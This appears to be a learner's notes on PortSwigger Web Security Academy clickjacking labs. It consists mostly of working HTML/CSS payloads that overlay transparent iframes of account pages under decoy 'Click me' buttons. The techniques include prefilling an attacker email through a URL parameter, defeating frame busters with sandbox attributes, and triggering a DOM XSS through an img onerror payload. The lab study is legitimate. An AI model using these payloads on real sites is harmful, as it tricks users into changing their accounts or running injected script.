Basically, clickjacking is when user click something, it click another things.
### Basic clickjacking with CSRF token protection
**Payload**:
```html
<style>
		#target_website {
			position:relative;
			width:500px;
			height:700px;
			opacity:0.1;
			z-index:2;
			}
		#decoy_website {
			position:absolute;
			top:500px;
            left:60px;
			z-index:1;
			}
	</style>
	<div id="decoy_website">
	click
	</div>
	<iframe id="target_website" src="https://0a00003104da9d6c809d032200070076.web-security-academy.net/my-account">
	</iframe>
```
make sure the top and the height is in the same pixel, so when the target click the button, it will click the iframe

### Clickjacking with form input data prefilled from a URL parameter
**Payload** :
```html
<style>
		#target_website {
			position:relative;
			width:500px;
			height:700px;
			opacity:0.1;
			z-index:2;
			}
		#decoy_website {
			position:absolute;
			top:450px;
            left:60px;
			z-index:1;
			}
	</style>
	<div id="decoy_website">
	Click me
	</div>
	<iframe id="target_website" src="https://0a92003f03acb4458252246000670047.web-security-academy.net/my-account?email=hacker@attacker-website.com">
	</iframe>
```
Just knew, that you can prefilled the form input with url parameter

### Clickjacking with a frame buster script
**Payload** :
```html
<style>
		#target_website {
			position:relative;
			width:500px;
			height:700px;
			opacity:0.1;
			z-index:2;
			}
		#decoy_website {
			position:absolute;
			top:450px;
            left:60px;
			z-index:1;
			}
	</style>
	<div id="decoy_website">
	Click me
	</div>
	<iframe id="target_website" src="https://0a8f006d03a59e3d8004583d00270075.web-security-academy.net/my-account?email=hacker@attacker-website.com" sandbox="allow-forms">
	</iframe>
```
Some website, prevenet iframe by implement Frame busting techniques, that can bypass it by add sandbox="allow-forms" or allow-scripts

### Exploiting clickjacking vulnerability to trigger DOM-based XSS
**Payload**:
```html
<style>
		#target_website {
			position:relative;
			width:600px;
			height:900px;
			opacity:0.1;
			z-index:2;
			}
		#decoy_website {
			position:absolute;
			top:790px;
            left:60px;
			z-index:1;
			}
	</style>
	<div id="decoy_website">
	Click me
	</div>
	<iframe id="target_website" src="https://0a0900a8032611a580710d6a000e0000.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=lalala@gmail.com&subject=aaaaaa&message=aaa">
	</iframe>
```

### Multistep clickjacking
**Payload** :
```html
<style>
	iframe {
		position:relative;
		width:500px;
		height: 700px;
		opacity: 0.1;
		z-index: 2;
	}
   .firstClick, .secondClick {
		position:absolute;
		top:494px;
		left:60px;
		z-index: 1;
	}
   .secondClick {
		top:290px;
		left:210px;
	}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://0a4000060380f67d80d312dd00c2004a.web-security-academy.net/my-account"></iframe>
```
